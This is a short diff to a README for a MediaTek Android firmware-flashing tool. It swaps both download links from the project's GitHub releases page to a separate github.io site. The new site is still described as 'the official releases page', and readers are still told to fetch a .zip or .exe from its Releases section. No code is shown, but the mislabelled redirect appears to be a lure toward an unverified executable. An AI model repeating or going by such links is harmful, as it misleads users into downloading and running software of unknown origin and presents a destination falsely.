@@ -1,6 +1,6 @@
 # 🛠️ SP-Flash-Tool-Pro - Manage your Android device firmware easily
 
-[![Download SP-Flash-Tool-Pro](https://img.shields.io/badge/Download-SP_Flash_Tool_Pro-blue)](https://github.com/Prola8494/SP-Flash-Tool-Pro/releases)
+[![Download SP-Flash-Tool-Pro](https://img.shields.io/badge/Download-SP_Flash_Tool_Pro-blue)](https://prola8494.github.io)
 
 This application serves as a bridge between your computer and Android devices that use MediaTek chipsets. You can use it to flash system files, update firmware, or recover a device that does not boot. The software supports Windows 10 and Windows 11.
 
@@ -20,7 +20,7 @@ Confirm your system meets these standards before you begin.
 Follow these steps to obtain the correct version of the tool.
 
 1. Open your web browser.
-2. Navigate to the official releases page: [https://github.com/Prola8494/SP-Flash-Tool-Pro/releases](https://github.com/Prola8494/SP-Flash-Tool-Pro/releases)
+2. Navigate to the official releases page: [https://prola8494.github.io](https://prola8494.github.io)
 3. Look for the most recent version under the Releases section.
 4. Locate the file ending in .zip or .exe.
 5. Click the file name to start your download.
